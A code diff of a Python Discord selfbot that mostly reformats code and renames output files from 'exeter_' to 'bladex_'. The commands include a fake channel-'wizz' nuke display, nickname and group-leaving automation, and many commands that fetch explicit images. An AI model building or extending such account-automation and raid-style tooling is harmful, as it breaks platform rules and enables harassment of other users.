-            content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...`")
+            content=
+            f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...`"
+        )
         await asyncio.sleep(1)
         await message.edit(
-            content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\n`")
+            content=
+            f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\n`"
+        )
         await asyncio.sleep(1)
         await message.edit(
-            content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\nKicking {len(ctx.message.channel.recipients)} Users...`")
+            content=
+            f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\nKicking {len(ctx.message.channel.recipients)} Users...`"
+        )
 
 
 @xans.command(name='8ball')
 async def _ball(ctx, *, question):
     await ctx.message.delete()
     responses = [
-        'That is a resounding no',
-        'It is not looking likely',
-        'Too hard to tell',
-        'It is quite possible',
-        'That is a definite yes!',
-        'Maybe',
-        'There is a good chance'
+        'That is a resounding no', 'It is not looking likely',
+        'Too hard to tell', 'It is quite possible', 'That is a definite yes!',
+        'Maybe', 'There is a good chance'
     ]
     answer = random.choice(responses)
     embed = discord.Embed()
     embed.add_field(name="Question", value=question, inline=False)
     embed.add_field(name="Answer", value=answer, inline=False)
-    embed.set_thumbnail(url="https://www.horoscope.com/images-US/games/game-magic-8-ball-no-text.png")
+    embed.set_thumbnail(
+        url=
+        "https://www.horoscope.com/images-US/games/game-magic-8-ball-no-text.png"
+    )
     await ctx.send(embed=embed)
 
 
@@ -2374,14 +2748,26 @@ async def slot(ctx):
     c = random.choice(emojis)
     slotmachine = f"**[ {a} {b} {c} ]\n{ctx.author.name}**,"
     if a == b == c:
-        await ctx.send(embed=discord.Embed.from_dict(
-            {"title": "Slot machine", "description": f"{slotmachine} All matchings, you won!"}))
+        await ctx.send(
+            embed=discord.Embed.from_dict(
+                {
+                    "title": "Slot machine",
+                    "description": f"{slotmachine} All matchings, you won!"
+                }))
     elif (a == b) or (a == c) or (b == c):
-        await ctx.send(embed=discord.Embed.from_dict(
-            {"title": "Slot machine", "description": f"{slotmachine} 2 in a row, you won!"}))
+        await ctx.send(
+            embed=discord.Embed.from_dict(
+                {
+                    "title": "Slot machine",
+                    "description": f"{slotmachine} 2 in a row, you won!"
+                }))
     else:
-        await ctx.send(embed=discord.Embed.from_dict(
-            {"title": "Slot machine", "description": f"{slotmachine} No match, you lost"}))
+        await ctx.send(
+            embed=discord.Embed.from_dict(
+                {
+                    "title": "Slot machine",
+                    "description": f"{slotmachine} No match, you lost"
+                }))
 
 
 @xans.command()
@@ -2407,14 +2793,17 @@ async def banner(ctx):
     await ctx.send(embed=em)
 
 
-@xans.command(name='first-message', aliases=['firstmsg', 'fm', 'firstmessage'])
+@xans.command(
+    name='first-message', aliases=['firstmsg', 'fm', 'firstmessage'])
 async def _first_message(ctx, channel: discord.TextChannel = None):
     await ctx.message.delete()
     if channel is None:
         channel = ctx.channel
-    first_message = (await channel.history(limit=1, oldest_first=True).flatten())[0]
+    first_message = (await channel.history(limit=1,
+                                           oldest_first=True).flatten())[0]
     embed = discord.Embed(description=first_message.content)
-    embed.add_field(name="First Message", value=f"[Jump]({first_message.jump_url})")
+    embed.add_field(
+        name="First Message", value=f"[Jump]({first_message.jump_url})")
     await ctx.send(embed=embed)
 
 
@@ -2445,8 +2834,10 @@ async def nickall(ctx, nickname):
 async def youtube(ctx, *, search):
     await ctx.message.delete()
     query_string = parse.urlencode({'search_query': search})
-    html_content = request.urlopen('http://www.youtube.com/results?' + query_string)
-    search_results = re.findall('href=\"\\/watch\\?v=(.{11})', html_content.read().decode())
+    html_content = request.urlopen('http://www.youtube.com/results?' +
+                                   query_string)
+    search_results = re.findall('href=\"\\/watch\\?v=(.{11})',
+                                html_content.read().decode())
     await ctx.send('https://www.youtube.com/watch?v=' + search_results[0])
 
 
@@ -2459,8 +2850,10 @@ async def prefix(ctx, prefix):
 @xans.command()
 async def abc(ctx):
     await ctx.message.delete()
-    ABC = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'ñ', 'o', 'p', 'q', 'r', 's', 't', 'u',
-           'v', 'w', 'x', 'y', 'z']
+    ABC = [
+        'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
+        'ñ', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'
+    ]
     message = await ctx.send(ABC[0])
     await asyncio.sleep(2)
     for _next in ABC[1:]:
@@ -2481,12 +2874,17 @@ async def _100(ctx):
 @xans.command(aliases=['bitcoin'])
 async def btc(ctx):
     await ctx.message.delete()
-    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR')
+    r = requests.get(
+        'https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR')
     r = r.json()
     usd = r['USD']
     eur = r['EUR']
     em = discord.Embed(description=f'USD: `{str(usd)}$`\nEUR: `{str(eur)}€`')
-    em.set_author(name='Bitcoin', icon_url='https://cdn.pixabay.com/photo/2013/12/08/12/12/bitcoin-225079_960_720.png')
+    em.set_author(
+        name='Bitcoin',
+        icon_url=
+        'https://cdn.pixabay.com/photo/2013/12/08/12/12/bitcoin-225079_960_720.png'
+    )
     await ctx.send(embed=em)
 
 
@@ -2500,13 +2898,16 @@ async def hastebin(ctx, *, message):
 @xans.command(aliases=["fancy"])
 async def ascii(ctx, *, text):
     await ctx.message.delete()
-    r = requests.get(f'http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}').text
+    r = requests.get(
+        f'http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}'
+    ).text
     if len('```' + r + '```') > 2000:
         return
     await ctx.send(f"```{r}```")
 
 
-@xans.command(pass_context=True, aliases=["cyclename", "autoname", "autonick", "cycle"])
+@xans.command(
+    pass_context=True, aliases=["cyclename", "autoname", "autonick", "cycle"])
 async def cyclenick(ctx, *, text):
     await ctx.message.delete()
     global cycling
@@ -2518,7 +2919,9 @@ async def cyclenick(ctx, *, text):
             await ctx.message.author.edit(nick=name)
 
 
-@xans.command(aliases=["stopcyclename", "cyclestop", "stopautoname", "stopautonick", "stopcycle"])
+@xans.command(aliases=[
+    "stopcyclename", "cyclestop", "stopautoname", "stopautonick", "stopcycle"
+])
 async def stopcyclenick(ctx):
     await ctx.message.delete()
     global cycling
@@ -2599,7 +3002,7 @@ async def dog(ctx):
             async with session.get(link) as resp:
                 image = await resp.read()
         with io.BytesIO(image) as file:
-            await ctx.send(file=discord.File(file, f"exeter_dog.png"))
+            await ctx.send(file=discord.File(file, f"bladex_dog.png"))
     except:
         await ctx.send(link)
 
@@ -2614,7 +3017,7 @@ async def cat(ctx):
             async with session.get(link) as resp:
                 image = await resp.read()
         with io.BytesIO(image) as file:
-            await ctx.send(file=discord.File(file, f"exeter_cat.png"))
+            await ctx.send(file=discord.File(file, f"bladex_cat.png"))
     except:
         await ctx.send(link)
 
@@ -2629,7 +3032,7 @@ async def sadcat(ctx):
             async with session.get(link) as resp:
                 image = await resp.read()
         with io.BytesIO(image) as file:
-            await ctx.send(file=discord.File(file, f"exeter_sadcat.png"))
+            await ctx.send(file=discord.File(file, f"bladex_sadcat.png"))
     except:
         await ctx.send(link)
 
@@ -2644,7 +3047,7 @@ async def bird(ctx):
             async with session.get(link) as resp:
                 image = await resp.read()
         with io.BytesIO(image) as file:
-            await ctx.send(file=discord.File(file, f"exeter_bird.png"))
+            await ctx.send(file=discord.File(file, f"bladex_bird.png"))
     except:
         await ctx.send(link)
 
@@ -2659,7 +3062,7 @@ async def fox(ctx):
             async with session.get(link) as resp:
                 image = await resp.read()
         with io.BytesIO(image) as file:
-            await ctx.send(file=discord.File(file, f"exeter_fox.png"))
+            await ctx.send(file=discord.File(file, f"bladex_fox.png"))
     except:
         await ctx.send(link)
 
@@ -2674,7 +3077,7 @@ async def anal(ctx):
             async with session.get(res['url']) as resp:
                 image = await resp.read()
         with io.BytesIO(image) as file:
-            await ctx.send(file=discord.File(file, f"exeter_anal.gif"))
+            await ctx.send(file=discord.File(file, f"bladex_anal.gif"))
     except:
         em = discord.Embed()
         em.set_image(url=res['url'])
@@ -2691,7 +3094,7 @@ async def erofeet(ctx):
             async with session.get(res['url']) as resp:
                 image = await resp.read()
         with io.BytesIO(image) as file:
-            await ctx.send(file=discord.File(file, f"exeter_erofeet.png"))
+            await ctx.send(file=discord.File(file, f"bladex_erofeet.png"))
     except:
         em = discord.Embed()
         em.set_image(url=res['url'])
@@ -2708,7 +3111,7 @@ async def feet(ctx):
             async with session.get(res['url']) as resp:
                 image = await resp.read()
         with io.BytesIO(image) as file:
-            await ctx.send(file=discord.File(file, f"exeter_feet.gif"))
+            await ctx.send(file=discord.File(file, f"bladex_feet.gif"))
     except:
         em = discord.Embed()
         em.set_image(url=res['url'])
@@ -2725,7 +3128,7 @@ async def hentai(ctx):
             async with session.get(res['url']) as resp:
                 image = await resp.read()
         with io.BytesIO(image) as file:
-            await ctx.send(file=discord.File(file, f"exeter_hentai.gif"))
+            await ctx.send(file=discord.File(file, f"bladex_hentai.gif"))
     except:
         em = discord.Embed()
         em.set_image(url=res['url'])
@@ -2742,7 +3145,7 @@ async def boobs(ctx):
             async with session.get(res['url']) as resp:
                 image = await resp.read()
         with io.BytesIO(image) as file:
-            await ctx.send(file=discord.File(file, f"exeter_boobs.gif"))
+            await ctx.send(file=discord.File(file, f"bladex_boobs.gif"))
     except:
         em = discord.Embed()
         em.set_image(url=res['url'])
@@ -2759,7 +3162,7 @@ async def tits(ctx):
             async with session.get(res['url']) as resp:
                 image = await resp.read()
         with io.BytesIO(image) as file:
-            await ctx.send(file=discord.File(file, f"exeter_tits.gif"))
+            await ctx.send(file=discord.File(file, f"bladex_tits.gif"))
     except:
         em = discord.Embed()
         em.set_image(url=res['url'])
@@ -2776,7 +3179,7 @@ async def blowjob(ctx):
             async with session.get(res['url']) as resp:
                 image = await resp.read()
         with io.BytesIO(image) as file:
-            await ctx.send(file=discord.File(file, f"exeter_blowjob.gif"))
+            await ctx.send(file=discord.File(file, f"bladex_blowjob.gif"))
     except:
         em = discord.Embed()
         em.set_image(url=res['url'])
@@ -2793,7 +3196,7 @@ async def lewdneko(ctx):
             async with session.get(res['url']) as resp:
                 image = await resp.read()
         with io.BytesIO(image) as file:
-            await ctx.send(file=discord.File(file, f"exeter_neko.gif"))
+            await ctx.send(file=discord.File(file, f"bladex_neko.gif"))
     except:
         em = discord.Embed()
         em.set_image(url=res['url'])
@@ -2810,7 +3213,7 @@ async def lesbian(ctx):
             async with session.get(res['url']) as resp:
                 image = await resp.read()
         with io.BytesIO(image) as file:
-            await ctx.send(file=discord.File(file, f"exeter_lesbian.gif"))
+            await ctx.send(file=discord.File(file, f"bladex_lesbian.gif"))
     except:
         em = discord.Embed()
         em.set_image(url=res['url'])
@@ -2827,7 +3230,7 @@ async def cumslut(ctx):
             async with session.get(res['url']) as resp:
                 image = await resp.read()
         with io.BytesIO(image) as file:
-            await ctx.send(file=discord.File(file, f"exeter_cumslut.gif"))
+            await ctx.send(file=discord.File(file, f"bladex_cumslut.gif"))
     except:
         em = discord.Embed()
         em.set_image(url=res['url'])
@@ -2844,7 +3247,7 @@ async def pussy(ctx):
             async with session.get(res['url']) as resp:
                 image = await resp.read()
         with io.BytesIO(image) as file:
-            await ctx.send(file=discord.File(file, f"exeter_pussy.gif"))
+            await ctx.send(file=discord.File(file, f"bladex_pussy.gif"))
     except:
         em = discord.Embed()
         em.set_image(url=res['url'])
@@ -2861,7 +3264,7 @@ async def waifu(ctx):
             async with session.get(res['url']) as resp:
                 image = await resp.read()
         with io.BytesIO(image) as file:
-            await ctx.send(file=discord.File(file, f"exeter_waifu.gif"))
+            await ctx.send(file=discord.File(file, f"bladex_waifu.gif"))
     except:
         em = discord.Embed()
         em.set_image(url=res['url'])
@@ -2878,7 +3281,8 @@ async def feed(ctx, user: discord.Member):
             async with session.get(res['url']) as resp:
                 image = await resp.read()
         with io.BytesIO(image) as file:
-            await ctx.send(user.mention, file=discord.File(file, f"exeter_feed.gif"))
+            await ctx.send(
+                user.mention, file=discord.File(file, f"bladex_feed.gif"))
     except:
         em = discord.Embed(description=user.mention)
         em.set_image(url=res['url'])
@@ -2895,7 +3299,8 @@ async def tickle(ctx, user: discord.Member):
             async with session.get(res['url']) as resp:
                 image = await resp.read()
         with io.BytesIO(image) as file:
-            await ctx.send(user.mention, file=discord.File(file, f"exeter_tickle.gif"))
+            await ctx.send(
+                user.mention, file=discord.File(file, f"bladex_tickle.gif"))
     except:
         em = discord.Embed(description=user.mention)
         em.set_image(url=res['url'])
@@ -2912,7 +3317,8 @@ async def slap(ctx, user: discord.Member):
             async with session.get(res['url']) as resp:
                 image = await resp.read()
         with io.BytesIO(image) as file:
-            await ctx.send(user.mention, file=discord.File(file, f"exeter_slap.gif"))
+            await ctx.send(
+                user.mention, file=discord.File(file, f"bladex_slap.gif"))
     except:
         em = discord.Embed(description=user.mention)
         em.set_image(url=res['url'])
@@ -2929,7 +3335,8 @@ async def hug(ctx, user: discord.Member):
             async with session.get(res['url']) as resp:
                 image = await resp.read()
         with io.BytesIO(image) as file:
-            await ctx.send(user.mention, file=discord.File(file, f"exeter_hug.gif"))
+            await ctx.send(
+                user.mention, file=discord.File(file, f"bladex_hug.gif"))
     except:
         em = discord.Embed(description=user.mention)
         em.set_image(url=res['url'])
@@ -2946,7 +3353,8 @@ async def cuddle(ctx, user: discord.Member):
             async with session.get(res['url']) as resp:
                 image = await resp.read()
         with io.BytesIO(image) as file:
-            await ctx.send(user.mention, file=discord.File(file, f"exeter_cuddle.gif"))
+            await ctx.send(
+                user.mention, file=discord.File(file, f"bladex_cuddle.gif"))
     except:
         em = discord.Embed(description=user.mention)
         em.set_image(url=res['url'])
@@ -2963,7 +3371,8 @@ async def smug(ctx, user: discord.Member):
             async with session.get(res['url']) as resp:
                 image = await resp.read()
         with io.BytesIO(image) as file:
-            await ctx.send(user.mention, file=discord.File(file, f"exeter_smug.gif"))
+            await ctx.send(
+                user.mention, file=discord.File(file, f"bladex_smug.gif"))
     except:
         em = discord.Embed(description=user.mention)
         em.set_image(url=res['url'])
@@ -2980,7 +3389,8 @@ async def pat(ctx, user: discord.Member):
             async with session.get(res['url']) as resp:
                 image = await resp.read()
         with io.BytesIO(image) as file:
-            await ctx.send(user.mention, file=discord.File(file, f"exeter_pat.gif"))
+            await ctx.send(
+                user.mention, file=discord.File(file, f"bladex_pat.gif"))
     except:
         em = discord.Embed(description=user.mention)
         em.set_image(url=res['url'])
@@ -2997,7 +3407,8 @@ async def kiss(ctx, user: discord.Member):
             async with session.get(res['url']) as resp:
                 image = await resp.read()
         with io.BytesIO(image) as file:
-            await ctx.send(user.mention, file=discord.File(file, f"exeter_kiss.gif"))
+            await ctx.send(
+                user.mention, file=discord.File(file, f"bladex_kiss.gif"))
     except:
         em = discord.Embed(description=user.mention)
         em.set_image(url=res['url'])
@@ -3007,7 +3418,8 @@ async def kiss(ctx, user: discord.Member):
 @xans.command()
 async def uptime(ctx):
     await ctx.message.delete()
-    now = datetime.datetime.utcnow()  # Timestamp of when uptime function is run
+    now = datetime.datetime.utcnow(
+    )  # Timestamp of when uptime function is run
     delta = now - start_time
     hours, remainder = divmod(int(delta.total_seconds()), 3600)
     minutes, seconds = divmod(remainder, 60)
@@ -3023,21 +3435,26 @@ async def uptime(ctx):
 @xans.command()
 async def purge(ctx, amount: int):
     await ctx.message.delete()
-    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == xans.user).map(
-            lambda m: m):
+    async for message in ctx.message.channel.history(limit=amount).filter(
+            lambda m: m.author == xans.user).map(lambda m: m):
         try:
             await message.delete()
         except:
             pass
 
 
-@xans.command(name='group-leaver',
-                aliase=['leaveallgroups', 'leavegroup', 'leavegroups', "groupleave", "groupleaver"])
+@xans.command(
+    name='group-leaver',
+    aliase=[
+        'leaveallgroups', 'leavegroup', 'leavegroups', "groupleave",
+        "groupleaver"
+    ])
 async def _group_leaver(ctx):
     await ctx.message.delete()
     for channel in xans.private_channels:
         if isinstance(channel, discord.GroupChannel):
             await channel.leave()
+
 
 
 @xans.command(aliases=["streaming"])
@@ -3053,9 +3470,7 @@ async def stream(ctx, *, message):
 @xans.command(alises=["game"])
 async def playing(ctx, *, message):
     await ctx.message.delete()
-    game = discord.Game(
-        name=message
-    )
+    game = discord.Game(name=message)
     await xans.change_presence(activity=game)
 
 
@@ -3068,18 +3483,19 @@ async def listening(ctx, *, message):
             name=message,
         ))
 
-
+                                                                                                                                                                                                                         
 @xans.command(aliases=["watch"])
 async def watching(ctx, *, message):
     await ctx.message.delete()
     await xans.change_presence(
         activity=discord.Activity(
-            type=discord.ActivityType.watching,
-            name=message
-        ))
+            type=discord.ActivityType.watching, name=message))
 
 
-@xans.command(aliases=["stopstreaming", "stopstatus", "stoplistening", "stopplaying", "stopwatching"])
+@xans.command(aliases=[
+    "stopstreaming", "stopstatus", "stoplistening", "stopplaying",
+    "stopwatching"
+])
 async def stopactivity(ctx):
     await ctx.message.delete()
     await xans.change_presence(activity=None, status=discord.Status.dnd)
@@ -3194,6 +3610,3 @@ async def nitro(ctx):
 
 if __name__ == '__main__':
     Init()
-
-
-- [ ] 
